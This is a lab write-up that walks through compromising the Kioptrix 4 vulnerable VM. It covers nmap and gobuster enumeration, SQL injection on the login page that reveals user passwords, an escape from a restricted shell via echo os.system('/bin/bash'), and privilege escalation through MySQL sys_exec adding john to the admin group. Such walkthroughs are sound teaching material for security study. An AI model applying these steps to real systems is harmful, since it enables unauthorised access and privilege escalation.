# Kioptrix: Level 1.3 AKA Kioptrix 4

### Solved using Metasploit

Host discovery

```
sudo nmap -sn -oN host_discovery.txt 192.168.69.0/24
# found 192.168.69.11
```

Full Scan (Sevice Version & Agressive )

```
sudo nmap -A -T4 -oN full_scan.txt 192.168.69.11
```

- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-T4`: Sets the timing template to "aggressive," speeding up the scan. The timing templates range from `-T0` (paranoid) to `-T5` (insane), with `-T4` being a commonly used fast option.

Let Specifically check for MySQL version check scan

```
nmap -p 3306 --script mysql-info -sV 192.168.69.11
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 07:56 CDT
Nmap scan report for 192.168.69.11
Host is up (0.0052s latency).

PORT     STATE    SERVICE VERSION
3306/tcp filtered mysql

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

it has a login page for member

<img src="../img/Pasted image 20240625180317.png" alt="Example Image" width="700"/>

URI Recon (Directory Traversal )

```
gobuster dir -u http://192.168.69.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html > uri.txt
```

```
/index.php            (Status: 200) [Size: 1255]
/.html                (Status: 403) [Size: 325]
/images               (Status: 301) [Size: 354] [--> http://192.168.69.11/images/]
/index                (Status: 200) [Size: 1255]
/member               (Status: 302) [Size: 220] [--> index.php]
/member.php           (Status: 302) [Size: 220] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/logout               (Status: 302) [Size: 0] [--> index.php]
/john                 (Status: 301) [Size: 352] [--> http://192.168.69.11/john/]
/robert               (Status: 301) [Size: 354] [--> http://192.168.69.11/robert/]
/.html                (Status: 403) [Size: 325]
/server-status        (Status: 403) [Size: 333]
```

in login page , i tried `'` in user and password , it is vulnerable to SQL injection as we see that below

<img src="../img/Pasted image 20240625182808.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240625183142.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240625183209.png" alt="Example Image" width="1080"/>

It worked , then see the uri.txt , found john and Robert are two uses , but `something went wrong` , due to above query , so logout from admin.

Try John user with same SQL Injection

<img src="../img/Pasted image 20240625184500.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240625184510.png" alt="Example Image" width="1080"/>

logout , login password for john

```
MyNameIsJohn
```

Then try user Robert

<img src="../img/Pasted image 20240625184721.png" alt="Example Image" width="1080"/>

```
ADGAdsafdfwt4gadfga==
```

As we got a two login credentials, from fullscan.txt we know that it's running openSSH services, try these login credentials over there.

<img src="../img/Pasted image 20240625185008.png" alt="Example Image" width="1080"/>
We got a shell , but `whoami` not working on that shell , `?` to see what all are command can be executable

```
?
cd  clear  echo  exit  help  ll  lpath  ls
```

we have `echo` , let execute python code , because it explicitly using a Python interpreter as `evn`

```
echo os.system("/bin/bash")
john@Kioptrix4:~$

cd /var/www
ls
checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert
cat checklogin.php

# We got a credential for MySQL DB

$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name

john@Kioptrix4:/var/www$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select sys_exec('usermod -a -G admin john');
```

we attempt to execute system cmd through SQL , `sudo su` enter john password

<img src="../img/Pasted image 20240625185930.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240625190100.png" alt="Example Image" width="1080"/>
